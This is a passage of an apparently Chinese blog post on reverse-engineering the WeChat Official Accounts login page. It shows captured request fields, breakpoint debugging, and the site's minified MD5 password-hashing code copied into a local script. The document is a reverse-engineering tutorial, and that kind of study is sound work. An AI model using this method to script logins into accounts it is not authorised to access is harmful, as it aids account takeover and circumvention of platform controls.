class=\"title function_\">charAt</span>(b &gt;&gt;&gt; <span class=\"number\">4</span> &amp; <span class=\"number\">15</span>) + u.<span class=\"title function_\">charAt</span>(b &amp; <span class=\"number\">15</span>)</span><br><span class=\"line\">            }</span><br><span class=\"line\">            <span class=\"keyword\">return</span> i</span><br><span class=\"line\">        }</span><br><span class=\"line\">        <span class=\"keyword\">function</span> <span class=\"title function_\">Q</span>(<span class=\"params\">n</span>) {</span><br><span class=\"line\">            <span class=\"keyword\">return</span> <span class=\"built_in\">unescape</span>(<span class=\"built_in\">encodeURIComponent</span>(n))</span><br><span class=\"line\">        }</span><br><span class=\"line\">        <span class=\"keyword\">function</span> <span class=\"title function_\">B</span>(<span class=\"params\">n</span>) {</span><br><span class=\"line\">            <span class=\"keyword\">return</span> $(<span class=\"title function_\">Q</span>(n))</span><br><span class=\"line\">        }</span><br><span class=\"line\">        <span class=\"keyword\">function</span> <span class=\"title function_\">x</span>(<span class=\"params\">n</span>) {</span><br><span class=\"line\">            <span class=\"keyword\">return</span> <span class=\"title function_\">z</span>(<span class=\"title function_\">B</span>(n))</span><br><span class=\"line\">        }</span><br><span class=\"line\">        <span class=\"keyword\">function</span> <span class=\"title function_\">M</span>(<span class=\"params\">n, u</span>) {</span><br><span class=\"line\">            <span class=\"keyword\">return</span> <span class=\"title function_\">q</span>(<span class=\"title function_\">Q</span>(n), <span class=\"title function_\">Q</span>(u))</span><br><span class=\"line\">        }</span><br><span class=\"line\">        <span class=\"keyword\">function</span> <span class=\"title function_\">R</span>(<span class=\"params\">n, u</span>) {</span><br><span class=\"line\">            <span class=\"keyword\">return</span> <span class=\"title function_\">z</span>(<span class=\"title function_\">M</span>(n, u))</span><br><span class=\"line\">        }</span><br><span class=\"line\">        getStr = <span class=\"keyword\">function</span>(<span class=\"params\">n, u, i</span>) {</span><br><span class=\"line\">            <span class=\"keyword\">if</span> (!u) {</span><br><span class=\"line\">                <span class=\"keyword\">if</span> (!i) {</span><br><span class=\"line\">                    <span class=\"keyword\">return</span> <span class=\"title function_\">x</span>(n)</span><br><span class=\"line\">                } <span class=\"keyword\">else</span> {</span><br><span class=\"line\">                    <span class=\"keyword\">return</span> <span class=\"title function_\">B</span>(n)</span><br><span class=\"line\">                }</span><br><span class=\"line\">            }</span><br><span class=\"line\">            <span class=\"keyword\">if</span> (!i) {</span><br><span class=\"line\">                <span class=\"keyword\">return</span> <span class=\"title function_\">R</span>(u, n)</span><br><span class=\"line\">            } <span class=\"keyword\">else</span> {</span><br><span class=\"line\">                <span class=\"keyword\">return</span> <span class=\"title function_\">M</span>(u, n)</span><br><span class=\"line\">            }</span><br><span class=\"line\">        }</span><br><span class=\"line\">    }</span><br><span class=\"line\">        .<span class=\"title function_\">call</span>(T, h, T, I),</span><br><span class=\"line\">    v !== <span class=\"keyword\">void</span> <span class=\"number\">0</span> &amp;&amp; (I.<span class=\"property\">exports</span> = v))</span><br><span class=\"line\">}()</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">var</span> password = <span class=\"string\">\"1234\"</span></span><br><span class=\"line\"><span class=\"variable language_\">console</span>.<span class=\"title function_\">log</span>(<span class=\"title function_\">getStr</span>(password.<span class=\"title function_\">substr</span>(<span class=\"number\">0</span>, <span class=\"number\">16</span>)))</span><br><span class=\"line\"><span class=\"comment\">// 81dc9bdb52d04dc20036dbd8313ed055</span></span><br></pre></td></tr></tbody></table></figure>\n","length":5420,"excerpt":"","more":"<h3 id=\"微信公众号加密算法分析\"><a href=\"#微信公众号加密算法分析\" class=\"headerlink\" title=\"微信公众号加密算法分析\"></a>微信公众号加密算法分析</h3><p>打开谷歌开发者工具，登录账户密码抓包。</p>\n<figure class=\"highlight yaml\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"attr\">username:</span> <span class=\"number\">1234</span></span><br><span class=\"line\"><span class=\"attr\">pwd:</span> <span class=\"string\">81dc9bdb52d04dc20036dbd8313ed055</span></span><br></pre></td></tr></table></figure>\n\n<p>查看调用栈，发现几个和<code>loginpage</code>相关，打上断点。</p>\n<img src=\"/posts/42054/image-20250312004307050.png\" class=\"\" title=\"image-20250312004307050\">\n\n<p>重新登录，开始调试</p>\n<img src=\"/posts/42054/image-20250312005430526.png\" class=\"\" title=\"image-20250312005430526\">\n\n<p>在第一个断点处并未加密，跳到下一个断点</p>\n<img src=\"/posts/42054/image-20250312005550419.png\" class=\"\" title=\"image-20250312005550419\">\n\n<p>这里<code>pwd</code>也还未加密，继续调试</p>\n<img src=\"/posts/42054/image-20250312005630018.png\" class=\"\" title=\"image-20250312005630018\">\n\n<p>仍未加密，跳到<code>p</code>函数处下断点，继续调试</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">k.<span class=\"property\">exports</span> = <span class=\"keyword\">function</span>(<span class=\"params\">n, u, i</span>) &#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (!u) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (!i) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">return</span> <span class=\"title function_\">x</span>(n)</span><br><span class=\"line\">        &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">            <span class=\"keyword\">return</span> <span class=\"title function_\">B</span>(n)</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (!i) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"title function_\">R</span>(u, n)</span><br><span class=\"line\">    &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"title function_\">M</span>(u, n)</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"comment\">// x(n)</span></span><br><span class=\"line\"><span class=\"comment\">// &#x27;81dc9bdb52d04dc20036dbd8313ed055&#x27;</span></span><br></pre></td></tr></table></figure>\n\n<p>那么这里就找到了加密函数位置，将代码复制到本地，改为自执行函数，并将上述函数结果用<code>getStr</code>变量接收。同时不能忘记加上<code>substr()</code>。</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"attr\">pwd</span>: <span class=\"title function_\">p</span>(r.<span class=\"property\">pwd</span>.<span class=\"title function_\">substr</span>(<span class=\"number\">0</span>, <span class=\"number\">16</span>))</span><br></pre></td></tr></table></figure>\n\n<p>那么最终代码如下</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br><span class=\"line\">112</span><br><span class=\"line\">113</span><br><span class=\"line\">114</span><br><span class=\"line\">115</span><br><span class=\"line\">116</span><br><span class=\"line\">117</span><br><span class=\"line\">118</span><br><span class=\"line\">119</span><br><span class=\"line\">120</span><br><span class=\"line\">121</span><br><span class=\"line\">122</span><br><span class=\"line\">123</span><br><span class=\"line\">124</span><br><span class=\"line\">125</span><br><span class=\"line\">126</span><br><span class=\"line\">127</span><br><span class=\"line\">128</span><br><span class=\"line\">129</span><br><span class=\"line\">130</span><br><span class=\"line\">131</span><br><span class=\"line\">132</span><br><span class=\"line\">133</span><br><span class=\"line\">134</span><br><span class=\"line\">135</span><br><span class=\"line\">136</span><br><span class=\"line\">137</span><br><span class=\"line\">138</span><br><span class=\"line\">139</span><br><span class=\"line\">140</span><br><span class=\"line\">141</span><br><span class=\"line\">142</span><br><span class=\"line\">143</span><br><span class=\"line\">144</span><br><span class=\"line\">145</span><br><span class=\"line\">146</span><br><span class=\"line\">147</span><br><span class=\"line\">148</span><br><span class=\"line\">149</span><br><span class=\"line\">150</span><br><span class=\"line\">151</span><br><span class=\"line\">152</span><br><span class=\"line\">153</span><br><span class=\"line\">154</span><br><span class=\"line\">155</span><br><span class=\"line\">156</span><br><span class=\"line\">157</span><br><span class=\"line\">158</span><br><span class=\"line\">159</span><br><span class=\"line\">160</span><br><span class=\"line\">161</span><br><span class=\"line\">162</span><br><span class=\"line\">163</span><br><span class=\"line\">164</span><br><span class=\"line\">165</span><br><span class=\"line\">166</span><br><span class=\"line\">167</span><br><span class=\"line\">168</span><br><span class=\"line\">169</span><br><span class=\"line\">170</span><br><span class=\"line\">171</span><br><span class=\"line\">172</span><br><span class=\"line\">173</span><br><span class=\"line\">174</span><br><span class=\"line\">175</span><br><span class=\"line\">176</span><br><span class=\"line\">177</span><br><span class=\"line\">178</span><br><span class=\"line\">179</span><br><span class=\"line\">180</span><br><span class=\"line\">181</span><br><span class=\"line\">182</span><br><span class=\"line\">183</span><br><span class=\"line\">184</span><br><span class=\"line\">185</span><br><span class=\"line\">186</span><br><span class=\"line\">187</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">var</span> getStr</span><br><span class=\"line\">!<span class=\"keyword\">function</span>(<span class=\"params\">I, T, h</span>) &#123;</span><br><span class=\"line\">    <span class=\"string\">&quot;use strict&quot;</span>;</span><br><span class=\"line\">    <span class=\"keyword\">var</span> v;</span><br><span class=\"line\">    ;!(v = <span class=\"keyword\">function</span>(<span class=\"params\">m, D, k</span>) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">function</span> <span class=\"title function_\">_</span>(<span class=\"params\">n, u</span>) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">var</span> i = (n &amp; <span class=\"number\">65535</span>) + (u &amp; <span class=\"number\">65535</span>)</span><br><span class=\"line\">                , b = (n &gt;&gt; <span class=\"number\">16</span>) + (u &gt;&gt; <span class=\"number\">16</span>) + (i &gt;&gt; <span class=\"number\">16</span>);</span><br><span class=\"line\">            <span class=\"keyword\">return</span> b &lt;&lt; <span class=\"number\">16</span> | i &amp; <span class=\"number\">65535</span></span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"keyword\">function</span> <span class=\"title function_\">E</span>(<span class=\"params\">n, u</span>) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">return</span> n &lt;&lt; u | n &gt;&gt;&gt; <span class=\"number\">32</span> - u</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"keyword\">function</span> <span class=\"title function_\">w</span>(<span class=\"params\">n, u, i, b, S, j</span>) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">return</span> <span class=\"title function_\">_</span>(<span class=\"title function_\">E</span>(<span class=\"title function_\">_</span>(<span class=\"title function_\">_</span>(u, n), <span class=\"title function_\">_</span>(b, j)), S), i)</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"keyword\">function</span> <span class=\"title function_\">C</span>(<span class=\"params\">n, u, i, b, S, j, F</span>) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">return</span> <span class=\"title function_\">w</span>(u &amp; i | ~u &amp; b, n, u, S, j, F)</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"keyword\">function</span> <span class=\"title function_\">d</span>(<span class=\"params\">n, u, i, b, S, j, F</span>) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">return</span> <span class=\"title function_\">w</span>(u &amp; b | i &amp; ~b, n, u, S, j, F)</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"keyword\">function</span> <span class=\"title function_\">l</span>(<span class=\"params\">n, u, i, b, S, j, F</span>) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">return</span> <span class=\"title function_\">w</span>(u ^ i ^ b, n, u, S, j, F)</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"keyword\">function</span> <span class=\"title function_\">p</span>(<span class=\"params\">n, u, i, b, S, j, F</span>) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">return</span> <span class=\"title function_\">w</span>(i ^ (u | ~b), n, u, S, j, F)</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"keyword\">function</span> <span class=\"title function_\">f</span>(<span class=\"params\">n, u</span>) &#123;</span><br><span class=\"line\">            n[u &gt;&gt; <span class=\"number\">5</span>] |= <span class=\"number\">128</span> &lt;&lt; u % <span class=\"number\">32</span>;</span><br><span class=\"line\">            n[(u + <span class=\"number\">64</span> &gt;&gt;&gt; <span class=\"number\">9</span> &lt;&lt; <span class=\"number\">4</span>) + <span class=\"number\">14</span>] = u;</span><br><span class=\"line\">            <span class=\"keyword\">var</span> i, b, S, j, F, s = <span class=\"number\">1732584193</span>, o = -<span class=\"number\">271733879</span>, a = -<span class=\"number\">1732584194</span>, t = <span class=\"number\">271733878</span>;</span><br><span class=\"line\">            <span class=\"keyword\">for</span> (i = <span class=\"number\">0</span>; i &lt; n.<span class=\"property\">length</span>; i += <span class=\"number\">16</span>) &#123;</span><br><span class=\"line\">                b = s;</span><br><span class=\"line\">                S = o;</span><br><span class=\"line\">                j = a;</span><br><span class=\"line\">                F = t;</span><br><span class=\"line\">                s = <span class=\"title function_\">C</span>(s, o, a, t, n[i], <span class=\"number\">7</span>, -<span class=\"number\">680876936</span>);</span><br><span class=\"line\">                t = <span class=\"title function_\">C</span>(t, s, o, a, n[i + <span class=\"number\">1</span>], <span class=\"number\">12</span>, -<span class=\"number\">389564586</span>);</span><br><span class=\"line\">                a = <span class=\"title function_\">C</span>(a, t, s, o, n[i + <span class=\"number\">2</span>], <span class=\"number\">17</span>, <span class=\"number\">606105819</span>);</span><br><span class=\"line\">                o = <span class=\"title function_\">C</span>(o, a, t, s, n[i + <span class=\"number\">3</span>], <span class=\"number\">22</span>, -<span class=\"number\">1044525330</span>);</span><br><span class=\"line\">                s = <span class=\"title function_\">C</span>(s, o, a, t, n[i + <span class=\"number\">4</span>], <span class=\"number\">7</span>, -<span class=\"number\">176418897</span>);</span><br><span class=\"line\">                t = <span class=\"title function_\">C</span>(t, s, o, a, n[i + <span class=\"number\">5</span>], <span class=\"number\">12</span>, <span class=\"number\">1200080426</span>);</span><br><span class=\"line\">                a = <span class=\"title function_\">C</span>(a, t, s, o, n[i + <span class=\"number\">6</span>], <span class=\"number\">17</span>, -<span class=\"number\">1473231341</span>);</span><br><span class=\"line\">                o = <span class=\"title function_\">C</span>(o, a, t, s, n[i + <span class=\"number\">7</span>], <span class=\"number\">22</span>, -<span class=\"number\">45705983</span>);</span><br><span class=\"line\">                s = <span class=\"title function_\">C</span>(s, o, a, t, n[i + <span class=\"number\">8</span>], <span class=\"number\">7</span>, <span class=\"number\">1770035416</span>);</span><br><span class=\"line\">                t = <span class=\"title function_\">C</span>(t, s, o, a, n[i + <span class=\"number\">9</span>], <span class=\"number\">12</span>, -<span class=\"number\">1958414417</span>);</span><br><span class=\"line\">                a = <span class=\"title function_\">C</span>(a, t, s, o, n[i + <span class=\"number\">10</span>], <span class=\"number\">17</span>, -<span class=\"number\">42063</span>);</span><br><span class=\"line\">                o = <span class=\"title function_\">C</span>(o, a, t, s, n[i + <span class=\"number\">11</span>], <span class=\"number\">22</span>, -<span class=\"number\">1990404162</span>);</span><br><span class=\"line\">                s = <span class=\"title function_\">C</span>(s, o, a, t, n[i + <span class=\"number\">12</span>], <span class=\"number\">7</span>, <span class=\"number\">1804603682</span>);</span><br><span class=\"line\">                t = <span class=\"title function_\">C</span>(t, s, o, a, n[i + <span class=\"number\">13</span>], <span class=\"number\">12</span>, -<span class=\"number\">40341101</span>);</span><br><span class=\"line\">                a = <span class=\"title function_\">C</span>(a, t, s, o, n[i + <span class=\"number\">14</span>], <span class=\"number\">17</span>, -<span class=\"number\">1502002290</span>);</span><br><span class=\"line\">                o = <span class=\"title function_\">C</span>(o, a, t, s, n[i + <span class=\"number\">15</span>], <span class=\"number\">22</span>, <span class=\"number\">1236535329</span>);</span><br><span class=\"line\">                s = <span class=\"title function_\">d</span>(s, o, a, t, n[i + <span class=\"number\">1</span>], <span class=\"number\">5</span>, -<span class=\"number\">165796510</span>);</span><br><span class=\"line\">                t = <span class=\"title function_\">d</span>(t, s, o, a, n[i + <span class=\"number\">6</span>], <span class=\"number\">9</span>, -<span class=\"number\">1069501632</span>);</span><br><span class=\"line\">                a = <span class=\"title function_\">d</span>(a, t, s, o, n[i + <span class=\"number\">11</span>], <span class=\"number\">14</span>, <span class=\"number\">643717713</span>);</span><br><span class=\"line\">                o = <span class=\"title function_\">d</span>(o, a, t, s, n[i], <span class=\"number\">20</span>, -<span class=\"number\">373897302</span>);</span><br><span class=\"line\">                s = <span class=\"title function_\">d</span>(s, o, a, t, n[i + <span class=\"number\">5</span>], <span class=\"number\">5</span>, -<span class=\"number\">701558691</span>);</span><br><span class=\"line\">                t = <span class=\"title function_\">d</span>(t, s, o, a, n[i + <span class=\"number\">10</span>], <span class=\"number\">9</span>, <span class=\"number\">38016083</span>);</span><br><span class=\"line\">                a = <span class=\"title function_\">d</span>(a, t, s, o, n[i + <span class=\"number\">15</span>], <span class=\"number\">14</span>, -<span class=\"number\">660478335</span>);</span><br><span class=\"line\">                o = <span class=\"title function_\">d</span>(o, a, t, s, n[i + <span class=\"number\">4</span>], <span class=\"number\">20</span>, -<span class=\"number\">405537848</span>);</span><br><span class=\"line\">                s = <span class=\"title function_\">d</span>(s, o, a, t, n[i + <span class=\"number\">9</span>], <span class=\"number\">5</span>, <span class=\"number\">568446438</span>);</span><br><span class=\"line\">                t = <span class=\"title function_\">d</span>(t, s, o, a, n[i + <span class=\"number\">14</span>], <span class=\"number\">9</span>, -<span class=\"number\">1019803690</span>);</span><br><span class=\"line\">                a = <span class=\"title function_\">d</span>(a, t, s, o, n[i + <span class=\"number\">3</span>], <span class=\"number\">14</span>, -<span class=\"number\">187363961</span>);</span><br><span class=\"line\">                o = <span class=\"title function_\">d</span>(o, a, t, s, n[i + <span class=\"number\">8</span>], <span class=\"number\">20</span>, <span class=\"number\">1163531501</span>);</span><br><span class=\"line\">                s = <span class=\"title function_\">d</span>(s, o, a, t, n[i + <span class=\"number\">13</span>], <span class=\"number\">5</span>, -<span class=\"number\">1444681467</span>);</span><br><span class=\"line\">                t = <span class=\"title function_\">d</span>(t, s, o, a, n[i + <span class=\"number\">2</span>], <span class=\"number\">9</span>, -<span class=\"number\">51403784</span>);</span><br><span class=\"line\">                a = <span class=\"title function_\">d</span>(a, t, s, o, n[i + <span class=\"number\">7</span>], <span class=\"number\">14</span>, <span class=\"number\">1735328473</span>);</span><br><span class=\"line\">                o = <span class=\"title function_\">d</span>(o, a, t, s, n[i + <span class=\"number\">12</span>], <span class=\"number\">20</span>, -<span class=\"number\">1926607734</span>);</span><br><span class=\"line\">                s = <span class=\"title function_\">l</span>(s, o, a, t, n[i + <span class=\"number\">5</span>], <span class=\"number\">4</span>, -<span class=\"number\">378558</span>);</span><br><span class=\"line\">                t = <span class=\"title function_\">l</span>(t, s, o, a, n[i + <span class=\"number\">8</span>], <span class=\"number\">11</span>, -<span class=\"number\">2022574463</span>);</span><br><span class=\"line\">                a = <span class=\"title function_\">l</span>(a, t, s, o, n[i + <span class=\"number\">11</span>], <span class=\"number\">16</span>, <span class=\"number\">1839030562</span>);</span><br><span class=\"line\">                o = <span class=\"title function_\">l</span>(o, a, t, s, n[i + <span class=\"number\">14</span>], <span class=\"number\">23</span>, -<span class=\"number\">35309556</span>);</span><br><span class=\"line\">                s = <span class=\"title function_\">l</span>(s, o, a, t, n[i + <span class=\"number\">1</span>], <span class=\"number\">4</span>, -<span class=\"number\">1530992060</span>);</span><br><span class=\"line\">                t = <span class=\"title function_\">l</span>(t, s, o, a, n[i + <span class=\"number\">4</span>], <span class=\"number\">11</span>, <span class=\"number\">1272893353</span>);</span><br><span class=\"line\">                a = <span class=\"title function_\">l</span>(a, t, s, o, n[i + <span class=\"number\">7</span>], <span class=\"number\">16</span>, -<span class=\"number\">155497632</span>);</span><br><span class=\"line\">                o = <span class=\"title function_\">l</span>(o, a, t, s, n[i + <span class=\"number\">10</span>], <span class=\"number\">23</span>, -<span class=\"number\">1094730640</span>);</span><br><span class=\"line\">                s = <span class=\"title function_\">l</span>(s, o, a, t, n[i + <span class=\"number\">13</span>], <span class=\"number\">4</span>, <span class=\"number\">681279174</span>);</span><br><span class=\"line\">                t = <span class=\"title function_\">l</span>(t, s, o, a, n[i], <span class=\"number\">11</span>, -<span class=\"number\">358537222</span>);</span><br><span class=\"line\">                a = <span class=\"title function_\">l</span>(a, t, s, o, n[i + <span class=\"number\">3</span>], <span class=\"number\">16</span>, -<span class=\"number\">722521979</span>);</span><br><span class=\"line\">                o = <span class=\"title function_\">l</span>(o, a, t, s, n[i + <span class=\"number\">6</span>], <span class=\"number\">23</span>, <span class=\"number\">76029189</span>);</span><br><span class=\"line\">                s = <span class=\"title function_\">l</span>(s, o, a, t, n[i + <span class=\"number\">9</span>], <span class=\"number\">4</span>, -<span class=\"number\">640364487</span>);</span><br><span class=\"line\">                t = <span class=\"title function_\">l</span>(t, s, o, a, n[i + <span class=\"number\">12</span>], <span class=\"number\">11</span>, -<span class=\"number\">421815835</span>);</span><br><span class=\"line\">                a = <span class=\"title function_\">l</span>(a, t, s, o, n[i + <span class=\"number\">15</span>], <span class=\"number\">16</span>, <span class=\"number\">530742520</span>);</span><br><span class=\"line\">                o = <span class=\"title function_\">l</span>(o, a, t, s, n[i + <span class=\"number\">2</span>], <span class=\"number\">23</span>, -<span class=\"number\">995338651</span>);</span><br><span class=\"line\">                s = <span class=\"title function_\">p</span>(s, o, a, t, n[i], <span class=\"number\">6</span>, -<span class=\"number\">198630844</span>);</span><br><span class=\"line\">                t = <span class=\"title function_\">p</span>(t, s, o, a, n[i + <span class=\"number\">7</span>], <span class=\"number\">10</span>, <span class=\"number\">1126891415</span>);</span><br><span class=\"line\">                a = <span class=\"title function_\">p</span>(a, t, s, o, n[i + <span class=\"number\">14</span>], <span class=\"number\">15</span>, -<span class=\"number\">1416354905</span>);</span><br><span class=\"line\">                o = <span class=\"title function_\">p</span>(o, a, t, s, n[i + <span class=\"number\">5</span>], <span class=\"number\">21</span>, -<span class=\"number\">57434055</span>);</span><br><span class=\"line\">                s = <span class=\"title function_\">p</span>(s, o, a, t, n[i + <span class=\"number\">12</span>], <span class=\"number\">6</span>, <span class=\"number\">1700485571</span>);</span><br><span class=\"line\">                t = <span class=\"title function_\">p</span>(t, s, o, a, n[i + <span class=\"number\">3</span>], <span class=\"number\">10</span>, -<span class=\"number\">1894986606</span>);</span><br><span class=\"line\">                a = <span class=\"title function_\">p</span>(a, t, s, o, n[i + <span class=\"number\">10</span>], <span class=\"number\">15</span>, -<span class=\"number\">1051523</span>);</span><br><span class=\"line\">                o = <span class=\"title function_\">p</span>(o, a, t, s, n[i + <span class=\"number\">1</span>], <span class=\"number\">21</span>, -<span class=\"number\">2054922799</span>);</span><br><span class=\"line\">                s = <span class=\"title function_\">p</span>(s, o, a, t, n[i + <span class=\"number\">8</span>], <span class=\"number\">6</span>, <span class=\"number\">1873313359</span>);</span><br><span class=\"line\">                t = <span class=\"title function_\">p</span>(t, s, o, a, n[i + <span class=\"number\">15</span>], <span class=\"number\">10</span>, -<span class=\"number\">30611744</span>);</span><br><span class=\"line\">                a = <span class=\"title function_\">p</span>(a, t, s, o, n[i + <span class=\"number\">6</span>], <span class=\"number\">15</span>, -<span class=\"number\">1560198380</span>);</span><br><span class=\"line\">                o = <span class=\"title function_\">p</span>(o, a, t, s, n[i + <span class=\"number\">13</span>], <span class=\"number\">21</span>, <span class=\"number\">1309151649</span>);</span><br><span class=\"line\">                s = <span class=\"title function_\">p</span>(s, o, a, t, n[i + <span class=\"number\">4</span>], <span class=\"number\">6</span>, -<span class=\"number\">145523070</span>);</span><br><span class=\"line\">                t = <span class=\"title function_\">p</span>(t, s, o, a, n[i + <span class=\"number\">11</span>], <span class=\"number\">10</span>, -<span class=\"number\">1120210379</span>);</span><br><span class=\"line\">                a = <span class=\"title function_\">p</span>(a, t, s, o, n[i + <span class=\"number\">2</span>], <span class=\"number\">15</span>, <span class=\"number\">718787259</span>);</span><br><span class=\"line\">                o = <span class=\"title function_\">p</span>(o, a, t, s, n[i + <span class=\"number\">9</span>], <span class=\"number\">21</span>, -<span class=\"number\">343485551</span>);</span><br><span class=\"line\">                s = <span class=\"title function_\">_</span>(s, b);</span><br><span class=\"line\">                o = <span class=\"title function_\">_</span>(o, S);</span><br><span class=\"line\">                a = <span class=\"title function_\">_</span>(a, j);</span><br><span class=\"line\">                t = <span class=\"title function_\">_</span>(t, F)</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">            <span class=\"keyword\">return</span> [s, o, a, t]</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"keyword\">function</span> <span class=\"title function_\">L</span>(<span class=\"params\">n</span>) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">var</span> u, i = <span class=\"string\">&quot;&quot;</span>;</span><br><span class=\"line\">            <span class=\"keyword\">for</span> (u = <span class=\"number\">0</span>; u &lt; n.<span class=\"property\">length</span> * <span class=\"number\">32</span>; u += <span class=\"number\">8</span>) &#123;</span><br><span class=\"line\">                i += <span class=\"title class_\">String</span>.<span class=\"title function_\">fromCharCode</span>(n[u &gt;&gt; <span class=\"number\">5</span>] &gt;&gt;&gt; u % <span class=\"number\">32</span> &amp; <span class=\"number\">255</span>)</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">            <span class=\"keyword\">return</span> i</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"keyword\">function</span> <span class=\"title function_\">y</span>(<span class=\"params\">n</span>) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">var</span> u, i = [];</span><br><span class=\"line\">            i[(n.<span class=\"property\">length</span> &gt;&gt; <span class=\"number\">2</span>) - <span class=\"number\">1</span>] = <span class=\"keyword\">void</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">            <span class=\"keyword\">for</span> (u = <span class=\"number\">0</span>; u &lt; i.<span class=\"property\">length</span>; u += <span class=\"number\">1</span>) &#123;</span><br><span class=\"line\">                i[u] = <span class=\"number\">0</span></span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">            <span class=\"keyword\">for</span> (u = <span class=\"number\">0</span>; u &lt; n.<span class=\"property\">length</span> * <span class=\"number\">8</span>; u += 